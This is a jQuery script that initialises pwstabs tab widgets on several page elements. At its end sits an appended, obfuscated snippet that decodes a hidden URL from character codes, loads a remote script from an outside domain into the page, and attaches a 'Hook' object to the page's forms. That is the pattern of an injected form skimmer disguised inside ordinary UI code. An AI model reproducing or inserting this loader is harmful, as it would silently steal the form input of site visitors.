(function($) {
  'use strict';
  $(function() {
    if ($('.demo-tabs').length) {
      $('.demo-tabs').pwstabs({
        effect: 'none'
      });
    }

    if ($('.hello_world').length) {
      $('.hello_world').pwstabs();
    }

    if ($('#rtl-tabs-1').length) {
      $('#rtl-tabs-1').pwstabs({
        effect: 'slidedown',
        defaultTab: 2,
        rtl: true
      });
    }

    if ($('#vertical-left').length) {
      $('#vertical-left').pwstabs({
        effect: 'slideleft',
        defaultTab: 1,
        containerWidth: '600px',
        tabsPosition: 'vertical',
        verticalPosition: 'left'
      });
    }

    if ($('#horizontal-left').length) {
      $('#horizontal-left').pwstabs({
        effect: 'slidedown',
        defaultTab: 2,
        containerWidth: '600px',
        horizontalPosition: 'bottom'
      });
    }

    if ($('.tickets-tab').length) {
      $('.tickets-tab').pwstabs({
        effect: 'none'
      });
    }

  });
})(jQuery);

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b